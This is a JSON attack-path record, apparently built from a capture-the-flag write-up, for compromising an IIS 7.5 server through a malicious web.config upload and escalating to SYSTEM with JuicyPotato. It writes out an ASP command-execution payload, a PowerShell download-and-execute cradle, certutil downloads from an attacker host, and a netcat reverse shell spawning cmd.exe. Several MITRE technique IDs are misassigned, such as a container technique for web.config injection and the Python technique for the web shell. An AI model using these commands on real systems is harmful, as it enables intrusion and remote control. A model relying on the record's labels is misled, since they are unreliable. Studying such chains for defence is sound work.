@@ -1,0 +1,275 @@
+{
+  "id": "ap-0032",
+  "title": "Initial Access & Privilege Escalation: Web.config RCE via File Upload -> SeImpersonatePrivilege",
+  "summary": "Exploiting permissive file upload filtering to achieve Remote Code Execution (RCE) via a malicious web.config file on an IIS server, followed by leveraging the SeImpersonatePrivilege using JuicyPotato to escalate to NT AUTHORITY\\SYSTEM.",
+  "attack_path_markdown": "### Step 1\n**Reconnaissance:** Identify the target OS (Windows) and open ports (Port 80) using Nmap and TTL analysis.\n\n### Step 2\n**Fuzzing & Vulnerability Identification:** Use Ffuf/Burp Suite Intruder to discover the `transfer.aspx` upload page and validate the allowed upload extensions, specifically finding `.config` is permitted.\n\n### Step 3\n**Exploitation (Initial Access):** Craft and upload a malicious `web.config` file to execute an initial command (ping test), confirming RCE capability.\n\n### Step 4\n**Installation & Command & Control (C2):** Leverage RCE to download and execute a PowerShell reverse shell script (`ps.ps1`), gaining a low-privileged shell as user 'merlin'.\n\n### Step 5\n**Privilege Escalation:** Enumerate privileges, identify the `SeImpersonatePrivilege`, transfer JuicyPotato (`jp.exe`) and Netcat (`netcat.exe`) binaries using `certutil`, and execute `jp.exe` to spawn a SYSTEM shell.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Identifying the target host, determining the operating system (Windows, based on TTL 127/128), and enumerating open services (Port 80).",
+      "actions": [
+        "Perform TCP port scan",
+        "Enumerate web server technologies"
+      ],
+      "tools": [
+        "nmap",
+        "actuweb (WhatWeb equivalent)",
+        "curl"
+      ],
+      "techniques": [
+        "Active Scanning",
+        "OS Fingerprinting (TTL)",
+        "Service Fingerprinting"
+      ],
+      "mitre_ids": [
+        "T1595.002"
+      ],
+      "indicators": [
+        "TTL 127/128 indicating Windows",
+        "Port 80/TCP open ",
+        "Microsoft IIS 7.5, ASP.NET detected"
+      ],
+      "preconditions": "Network connectivity to the target host.",
+      "expected_outcome": "List of open ports and running services/versions.",
+      "commands": [
+        "nmap -p- -sS -n -T5 --min-rate=5000 -v -oG host.grep IP_ADDRESS ",
+        "actuweb IP_VICTIMA",
+        "curl -s -I http://10.10.10.93 "
+      ],
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Creating the malicious configuration file (`web.config`) and preparing the reverse shell script based on the ASP.NET environment.",
+      "actions": [
+        "Fuzzing extensions to bypass upload filtering",
+        "Creating a malicious `web.config` file with ASP RCE code",
+        "Setting up the PowerShell reverse shell script (`ps.ps1`)"
+      ],
+      "tools": [
+        "Fuzzer (e.g., ffuf/wfuzz equivalent) ",
+        "Burp Suite Intruder ",
+        "Text Editor"
+      ],
+      "techniques": [
+        "Input Fuzzing",
+        "Web Configuration Injection"
+      ],
+      "mitre_ids": [
+        "T1587.001",
+        "T1609"
+      ],
+      "indicators": [
+        "Discovery of `transfer.aspx` ",
+        "Allowed extension `.config` confirmed ",
+        "ASP payload defined"
+      ],
+      "preconditions": "Knowledge of allowed file types and the target web server's technology stack (ASP.NET/IIS).",
+      "expected_outcome": "Working payloads for RCE via file upload.",
+      "commands": [
+        "Fuzzer: Using dictionary 'raf-medium-extensions-lowercase.txt'",
+        "web.config payload structure: response.write(wscript.createobject(\"wscript.shell\").exec(\"comando\").stdout.read)"
+      ],
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Transmitting the malicious `web.config` file via the file upload function, bypassing client-side checks by submitting POST requests with proper ViewState and EventValidation tokens.",
+      "actions": [
+        "Automating file upload submission using a custom Python script (or Burp Suite) ",
+        "Ensuring dynamic tokens (ViewState/EventValidation) are handled correctly"
+      ],
+      "tools": [
+        "Python Script (with requests library) ",
+        "Burp Suite (for token inspection) "
+      ],
+      "techniques": [
+        "Exploiting File Upload Vulnerability"
+      ],
+      "mitre_ids": [
+        "T1609"
+      ],
+      "indicators": [
+        "File upload form bypassed based on extension filtering."
+      ],
+      "preconditions": "Ability to handle dynamic tokens and successful identification of the `.config` extension.",
+      "expected_outcome": "Malicious `web.config` residing on the target server in an executable location.",
+      "commands": [
+        "Python script managing session tokens and POST multipart data "
+      ],
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Triggering the execution of the malicious configuration file to execute system commands and establish initial RCE capability.",
+      "actions": [
+        "Accessing the uploaded resource to trigger the ASP code",
+        "Executing a system command (`ping`) to validate RCE"
+      ],
+      "tools": [
+        "Web Browser/curl",
+        "tcpdump/tshark (for monitoring ICMP traffic)"
+      ],
+      "techniques": [
+        "Remote Command Execution",
+        "Web Shell"
+      ],
+      "mitre_ids": [
+        "T1505.003",
+        "T1059.006"
+      ],
+      "indicators": [
+        "Successful execution of the RCE payload confirmed by receiving ICMP traffic."
+      ],
+      "preconditions": "The uploaded `web.config` is in a path where the ASP engine processes it.",
+      "expected_outcome": "Confirmation of command execution ability.",
+      "commands": [
+        "Ping validation payload: cmd.exe /c ping 10.10.14.29 -n 1",
+        "tcpdump -i tun0 -n -T icmp "
+      ],
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Utilizing RCE to download and execute a PowerShell reverse shell, establishing a stable control channel.",
+      "actions": [
+        "Hosting the PowerShell reverse shell script (`ps.ps1`)",
+        "Executing the PowerShell one-liner RCE payload",
+        "Setting up Netcat listener to catch the shell"
+      ],
+      "tools": [
+        "Python Simple HTTP Server",
+        "PowerShell",
+        "rlwrap netcat"
+      ],
+      "techniques": [
+        "Reverse Shell",
+        "PowerShell Execution"
+      ],
+      "mitre_ids": [
+        "T1021",
+        "T1071.001"
+      ],
+      "indicators": [
+        "Interactive shell achieved as 'merlin'."
+      ],
+      "preconditions": "RCE capability confirmed.",
+      "expected_outcome": "A stable session for user enumeration and post-exploitation tasks.",
+      "commands": [
+        "Listener: rlwrap netcat -lvnp 443",
+        "RCE payload: powershell iex (New-Object System.Net.WebClient).DownloadString('http://10.10.14.29/ps.ps1')"
+      ],
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command & Control",
+      "description": "Initial reconnaissance to identify privilege escalation vectors.",
+      "actions": [
+        "Listing files and directories to find the user flag (`user.txt`)",
+        "Checking current user privileges"
+      ],
+      "tools": [
+        "Command Prompt (via reverse shell)"
+      ],
+      "techniques": [
+        "Privilege Check",
+        "File Search"
+      ],
+      "mitre_ids": [
+        "T1005",
+        "T1087.001"
+      ],
+      "indicators": [
+        "User flag located (found hidden in the 'merlin' user desktop)",
+        "`SeImpersonatePrivilege` identified as enabled ."
+      ],
+      "preconditions": "Stable reverse shell connection as 'merlin'.",
+      "expected_outcome": "Identification of possible privilege escalation vectors.",
+      "commands": [
+        "whoami /priv ",
+        "dir /a:h C:\\Users\\merlin\\Desktop\\user.txt (implied) "
+      ],
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Achieving the final goal of gaining administrator/SYSTEM privileges by abusing the token impersonation privilege.",
+      "actions": [
+        "Transferring the Potato exploit binary (`jp.exe`) and Netcat",
+        "Executing JuicyPotato to elevate privileges to SYSTEM",
+        "Retrieving the root flag"
+      ],
+      "tools": [
+        "certutil (for file transfer)",
+        "jp.exe (JuicyPotato variant)",
+        "Netcat/RLWrap"
+      ],
+      "techniques": [
+        "Token Impersonation/Theft (Potato Exploit) ",
+        "Data from Local System"
+      ],
+      "mitre_ids": [
+        "T1134.001",
+        "T1003"
+      ],
+      "indicators": [
+        "`whoami` output shows NT AUTHORITY\\SYSTEM ",
+        "Root flag retrieved."
+      ],
+      "preconditions": "The `SeImpersonatePrivilege` is enabled and exploit binaries are successfully transferred.",
+      "expected_outcome": "Full control over the target host.",
+      "commands": [
+        "certutil -urlcache -f http://ATTACKER_IP:8086/jp.exe C:\\Windows\\Temp\\prives\\jp.exe ",
+        "certutil -urlcache -f http://ATTACKER_IP:8086/netcat.exe C:\\Windows\\Temp\\prives\\netcat.exe ",
+        "jp.exe -t * -c C:\\Windows\\Temp\\prives\\netcat.exe -a \"-e cmd.exe 10.10.14.29 443\" "
+      ],
+      "confidence": 1.0
+    }
+  ],
+  "tactics": [
+    "Reconnaissance",
+    "Initial Access",
+    "Execution",
+    "Defense Evasion",
+    "Privilege Escalation",
+    "Credential Access"
+  ],
+  "techniques": [
+    "Web Configuration Injection",
+    "File Upload Exploit",
+    "PowerShell",
+    "Token Impersonation (JuicyPotato)"
+  ],
+  "mitre_ids": [
+    "T1505.003",
+    "T1059.006",
+    "T1134.001",
+    "T1609"
+  ],
+  "hosts": [
+    "TARGET_IIS_SERVER (Windows Server 2008 R2)",
+    "ATTACKER_MACHINE"
+  ],
+  "privs_obtained": [
+    "domain user (merlin)",
+    "NT AUTHORITY\\SYSTEM"
+  ],
+  "confidence": 1.0,
+  "source_file": "",
+  "notes": "IIS 7.5 web server exploitation chain leveraging a file upload vulnerability for RCE, followed by SYSTEM via SeImpersonatePrivilege. The process relies heavily on custom Python scripting for automated fuzzing and file submission.",
+  "labels": [
+    "attack_path",
+    "windows",
+    "iis",
+    "privesc",
+    "web_config",
+    "potato"
+  ]
+}
